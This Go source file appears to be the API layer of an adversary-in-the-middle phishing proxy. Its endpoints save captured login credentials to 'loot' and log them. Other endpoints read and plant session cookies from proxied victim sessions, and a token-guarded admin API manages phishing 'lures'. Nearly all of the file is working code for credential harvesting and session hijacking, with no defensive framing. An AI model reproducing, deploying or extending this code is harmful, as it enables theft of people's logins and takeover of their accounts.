package main

import (
	"net/http"
	"net/url"
	"strings"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/cors"
	"github.com/gofiber/fiber/v2/utils"
	"github.com/rs/zerolog"
	"github.com/valyala/fasthttp"
	"go.uber.org/multierr"
)

type APIConfig struct {
	// Hostname for API endpoints
	APIHostname string
	// API token for admin REST API
	APIToken string
	// DomainConverter used to convert proxy domain to target original domain
	DomainConverter DomainConverter
	// AuthHandler for cookies endpoints
	AuthHandler fiber.Handler
	// LootService to save login creds
	LootService LootService
	// LureService to admin lures
	LureService LureService
	// CookieSaver to save cookies set from browsers
	CookieSaver CookieSaver
}

func NewAPIMiddleware(log *zerolog.Logger, conf APIConfig) fiber.Handler {
	m := &apiMiddleware{APIConfig: &conf, log: log}
	api := fiber.New()
	api.Use(cors.New(cors.Config{
		AllowCredentials: true,
	}))
	tokenAuth := func(c *fiber.Ctx) error {
		if m.APIToken != c.Get("X-API-Token") {
			return c.SendStatus(fiber.StatusForbidden)
		}
		return c.Next()
	}
	api.Post("/login", conf.AuthHandler, func(c *fiber.Ctx) (err error) {
		return m.SaveCreds(c)
	})
	api.Get("/cookies", conf.AuthHandler, func(c *fiber.Ctx) error {
		return m.GetCookies(c)
	})
	api.Post("/cookies", conf.AuthHandler, func(c *fiber.Ctx) error {
		return m.CreateCookie(c)
	})
	// admin REST API
	luresAPI := api.Group("/lures", tokenAuth)
	luresAPI.Get("", func(c *fiber.Ctx) error {
		return m.GetLures(c)
	})
	luresAPI.Post("", func(c *fiber.Ctx) error {
		return m.CreateLure(c)
	})
	luresAPI.Delete("/:lureURL", func(c *fiber.Ctx) error {
		lureURL, err := url.QueryUnescape(c.Params("lureURL"))
		if err != nil {
			return err
		}
		return m.DeleteLure(lureURL)
	})
	apiHandler := api.Handler()
	return func(c *fiber.Ctx) error {
		if c.Hostname() != conf.APIHostname {
			return c.Next()
		}
		apiHandler(c.Context())
		return nil
	}
}

type apiMiddleware struct {
	*APIConfig
	log *zerolog.Logger
}

func (m *apiMiddleware) GetCookies(c *fiber.Ctx) error {
	destURL, err := m.getOrigin(c)
	if err != nil {
		return err
	}
	cookieJar := getProxySession(c).CookieJar()
	cookies := cookieJar.Cookies(destURL)
	cookieStr := make([]string, 0, len(cookies))
	for _, cookie := range cookies {
		cookieStr = append(cookieStr, cookie.String())
	}
	return c.SendString(strings.Join(cookieStr, "; "))
}

func (m *apiMiddleware) CreateCookie(c *fiber.Ctx) error {
	destURL, err := m.getOrigin(c)
	if err != nil {
		return err
	}
	cookie := &fasthttp.Cookie{}
	if err := cookie.ParseBytes(c.Body()); err != nil {
		return err
	}
	// TODO convert cookie domain
	newCookie := &http.Cookie{
		Name:     utils.UnsafeString(cookie.Key()),
		Value:    utils.UnsafeString(cookie.Value()),
		Path:     utils.UnsafeString(cookie.Path()),
		Domain:   utils.UnsafeString(cookie.Domain()),
		Expires:  cookie.Expire(),
		MaxAge:   cookie.MaxAge(),
		Secure:   cookie.Secure(),
		HttpOnly: cookie.HTTPOnly(),
	}
	return m.CookieSaver.SaveCookies(c, destURL, []*http.Cookie{newCookie})
}

func (m *apiMiddleware) GetLures(c *fiber.Ctx) error {
	lures, err := m.LureService.GetAll()
	return multierr.Append(err, c.JSON(lures))
}

func (m *apiMiddleware) CreateLure(c *fiber.Ctx) (err error) {
	var lure APILure
	if err = c.BodyParser(&lure); err != nil {
		return
	}
	return m.LureService.Add(&lure)
}

func (m *apiMiddleware) DeleteLure(lureURL string) error {
	return m.LureService.DeleteByURL(lureURL)
}

func (m *apiMiddleware) getOrigin(c *fiber.Ctx) (destURL *url.URL, err error) {
	origin := m.DomainConverter.ToTargetURL(c.Get("Origin"))
	destURL, err = url.Parse(origin)
	return
}

func (m *apiMiddleware) SaveCreds(c *fiber.Ctx) (err error) {
	var info APILoginInfo
	if err = c.BodyParser(&info); err != nil {
		return
	}
	m.log.Info().Any("loginInfo", &info).Msg("save creds")
	return m.LootService.SaveCreds(c, &info)
}
